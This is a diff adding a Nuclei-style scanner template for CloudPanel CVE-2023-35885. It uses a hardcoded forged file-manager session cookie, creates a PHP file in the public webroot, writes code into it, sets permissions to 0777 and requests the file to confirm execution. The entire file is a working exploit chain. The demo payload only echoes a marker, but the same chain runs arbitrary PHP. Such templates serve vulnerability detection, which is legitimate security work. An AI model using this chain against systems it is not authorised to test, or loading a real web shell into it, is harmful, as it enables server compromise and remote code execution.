@@ -1,0 +1,74 @@
+id: cloudpanel-rce-cve-2023-35885
+info:
+  name: Cloudpanel Remote Code Execution Vulnerability (CVE-2023-35885)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,CVE-2023-35885
+  description: |
+    This template exploits a remote code execution vulnerability in Cloudpanel by
+    uploading a PHP file and executing it.
+
+variables:
+  session: "ZGVmNTAyMDA3ZDI0OGNjZmU0NTVkMGQ2NmJhMjUxYjdhYzg0NzcyYzBmNjM0ODg0ODY0OWYyZTQ0MjgwZDVjZDBjNmY3MWJiZWU4ZTM4OTU4ZmE4YjViNjE4MGJiZjQ4NzA3MzcwNTJiNzFhM2JjYTBmNTdiODQ4ZDZjYjhiNmY1N2U3YTM1YWY3YjA3MTM1ZTlkYjViMjY5OTkzM2Q3NTAyOWI0ZGQ5ZDZmOTFhYTVlZTRhZjg0ZTBmZTU5NjY4NGI4OGU0NjVkNDU4MWYxOTc2MGNiMGI0ZGY2MmZjM2RkMmI4N2RhMzJkYTU4NjNjMWFmMGZlOWIwZjcyZGRkNmFhYzk3ZGVlZmY="
+  t1: "{{rand_text_alphanumeric(4)}}"
+  t2: "{{base64(t1)}}"
+
+http:
+  - id: check-access
+    method: GET
+    path:
+      - "{{BaseURL}}/file-manager/"
+    headers:
+      Cookie: "clp-fm={{session}}"
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: create-file
+    method: POST
+    path:
+      - "{{BaseURL}}/file-manager/backend/makefile"
+    headers:
+      Cookie: "clp-fm={{session}}"
+      Content-Type: application/x-www-form-urlencoded
+    body: "id=/htdocs/app/files/public/&name={{t1}}.php"
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: upload-content
+    method: POST
+    path:
+      - "{{BaseURL}}/file-manager/backend/text"
+    headers:
+      Cookie: "clp-fm={{session}}"
+      Content-Type: application/x-www-form-urlencoded
+    body: "id=/htdocs/app/files/public/{{t1}}.php&content=<?php echo '{{t2}}'; ?>"
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: set-permission
+    method: POST
+    path:
+      - "{{BaseURL}}/file-manager/backend/permissions"
+    headers:
+      Cookie: "clp-fm={{session}}"
+      Content-Type: application/x-www-form-urlencoded
+    body: "id=/htdocs/app/files/public/{{t1}}.php&permissions=0777"
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: execute-file
+    method: GET
+    path:
+      - "{{BaseURL}}/{{t1}}.php"
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200 && contains(body, t2)"
